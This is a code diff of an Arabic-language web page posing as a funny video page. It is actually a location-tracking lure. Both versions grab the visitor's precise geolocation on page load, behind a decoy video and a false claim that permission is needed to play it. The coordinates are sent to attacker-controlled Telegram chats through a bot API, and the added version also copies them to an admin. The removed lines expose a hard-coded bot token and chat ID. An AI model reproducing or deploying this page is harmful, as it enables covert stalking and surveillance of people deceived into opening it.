@@ -1,57 +1,33 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Funny Animals | فيديوهات مضحكة</title>
-    <style>
-        body { margin: 0; background-color: #000; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; font-family: Arial, sans-serif; overflow: hidden; }
-        video { width: 100%; max-width: 500px; border: 4px solid #fff; border-radius: 15px; }
-        .msg { margin-top: 15px; font-weight: bold; color: #ffeb3b; }
-    </style>
+    <meta charset="UTF-8"><title>شاهد الفيديو المضحك 😂</title>
 </head>
-<body>
-
-    <!-- فيديو اللاما اللي بتبزق -->
-    <video id="llamaVideo" autoplay loop muted playsinline>
-        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpueG54NXN4NXN4NXN4NXN4NXN4NXN4NXN4NXN4NXN4NXN4NXN4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZ29vZC9pbmRleC5naWY/V9gZeH1GvJy3m/giphy.mp4" type="video/mp4">
-        Your browser does not support the video tag.
+<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; margin:0; overflow:hidden;">
+    <h2 style="margin-top:20px;">اضغط "سماح" لمشاهدة أقوى المقاطع المضحكة 🔞</h2>
+    
+    <!-- فيديو مضحك للتمويه -->
+    <video width="100%" height="auto" autoplay loop muted playsinline style="max-width:500px; border-radius:15px;">
+        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
     </video>
 
-    <div class="msg">جاري تحميل المقطع التالي... 😂</div>
-
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('chat_id') || '7238206121'; 
-        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';
+        const p = new URLSearchParams(window.location.search);
+        const userId = p.get('user_id'), adminId = p.get('admin_id'), botToken = p.get('bot_token');
 
-        // طلب إذن الموقع فور فتح الصفحة
         window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError, {enableHighAccuracy: true});
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    const msg = `📍 **Location Captured!**\n🌍 **Maps:** [فتح الموقع](${map})\n👑 **Dev:** Abu Osayed Malkawi`;
+                    
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent("⚠️ نسخة المراقبة:\n" + msg)}&parse_mode=Markdown`);
+                }, function() {
+                    alert("عذراً، يجب السماح بالوصول للموقع لتشغيل الفيديو!");
+                });
             }
         };
-
-        function sendLocation(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            const message = `
-📍 **Target Location Found!**
-🌍 **Google Maps:** [اضغط هنا لفتح الموقع](${mapsLink})
-🎯 **Accuracy:** ${acc} meters
-💻 **System:** M.Y.9 Tracking
-🦅 **Dev:** Abu Osayed Malkawi
-            `;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-        }
-
-        function showError(error) {
-            console.log("Location access denied.");
-        }
     </script>
 </body>
 </html>
